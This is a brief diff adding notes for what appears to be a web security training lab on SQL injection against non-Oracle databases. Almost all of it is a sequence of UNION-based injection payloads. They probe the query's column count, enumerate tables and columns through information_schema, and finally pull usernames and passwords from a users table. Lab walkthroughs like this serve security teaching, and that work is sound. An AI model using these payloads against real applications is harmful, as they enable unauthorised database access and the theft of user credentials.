@@ -1,0 +1,17 @@
+#Lab: SQL injection attack, listing the database contents on non-Oracle databases
+____________________________________________________________________________________________________________
+
+Gifts'UNION SELECT 'NULL','NULL'--
+
+
+Gifts'UNION SELECT TABLE_NAME,'NULL' FROM information_schema.tables-- :   
+
+
+Gifts'UNION SELECT COLUMN_NAME,'NULL' FROM information_schema.columns WHERE table_name = 'users_xbmaqd'-- :   username_euguzw  password_nvuvkw
+
+
+Gifts'UNION SELECT username_euguzw,password_nvuvkw FROM users_xbmaqd ---
+
+
+
+	
